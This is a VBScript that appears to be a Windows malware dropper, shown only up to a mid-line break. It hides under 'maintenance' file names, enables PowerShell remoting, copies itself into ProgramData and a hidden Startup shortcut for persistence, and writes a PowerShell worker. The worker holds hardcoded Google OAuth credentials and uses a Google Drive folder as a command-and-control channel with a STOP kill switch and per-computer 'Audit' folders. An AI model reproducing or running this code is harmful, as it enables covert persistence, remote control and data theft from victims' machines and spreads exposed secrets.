Option Explicit

' --- 1. DECLARATIONS ---
Dim objFSO, objShell, objFile, objShortcut
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strPermanentPath, strStartupLnk
Dim currentScript

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
currentScript = WScript.ScriptFullName

' --- 2. CONFIG & PATHS ---
strWorkerName = "office_maint_v20.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
' Using ProgramData for persistence
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' --- 3. PERSISTENCE & SYSTEM SETUP ---
On Error Resume Next
' Unblock itself
objShell.Run "powershell.exe -Command ""Unblock-File -Path '" & currentScript & "'""", 0, True
' Setup Remote Management (Requires Admin)
objShell.Run "powershell.exe -Command ""Enable-PSRemoting -Force; Set-Item WSMan:\localhost\Client\TrustedHosts -Value '100.*' -Force""", 0, True

' Copy to ProgramData
If Not objFSO.FileExists(appDataPath) Then 
    objFSO.CopyFile currentScript, appDataPath, True
End If

' Create Startup Shortcut
If Not objFSO.FileExists(startupPath) Then
    Set objShortcut = objShell.CreateShortcut(startupPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & appDataPath & """"
    objShortcut.WindowStyle = 0
    objShortcut.Save
End If
On Error GoTo 0

' --- 4. WRITE POWERSHELL LOGIC ---
Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '677717926428-smega8knnqbrrvo6j4ctvllque8jmc2a.apps.googleusercontent.com'"
objFile.WriteLine "$SEC = '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'"
objFile.WriteLine "$TOK = '1//04ovknb57Ph3DCgYIARAAGAQSNwF-L9IrkTy0E_E3b8AIEQ-_jTTy3-o2BDaXitQhY95eLbtN6RM85rDIaOAqckKBZHntlbT09Io'"
objFile.WriteLine "$BaseID = '1YVAYlF68yQfbD5nyuEUqb1AesoLVV5Ff'"

' Auth Handshake
objFile.WriteLine "try { $a=Invoke-RestMethod -Uri 'https://accounts.google.com/o/oauth2/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h=@{Authorization=""Bearer $($a.access_token)""} } catch { exit }"

' STOP Logic
objFile.WriteLine "$q = [Uri]::EscapeDataString(""'$BaseID' in parents and trashed = false"")"
objFile.WriteLine "try { $df = (Invoke-RestMethod -Uri ""https://www.googleapis.com/drive/v3/files?q=$q&fields=files(name)"" -Headers $h).files.name"
objFile.WriteLine "$Pause = $false; foreach ($f in $df) { if ($f -ilike '*STOP*' -and ($f -ieq 'STOP' -or $f -ilike ""*STOP-$($env:COMPUTERNAME)*"")) { $Pause = $true } } } catch { $Pause = $false }"

' Session Folder Creation
objFile.WriteLine "$meta = @{name=""$($env:COMPUTERNAME)-Audit-$(Get-Date -
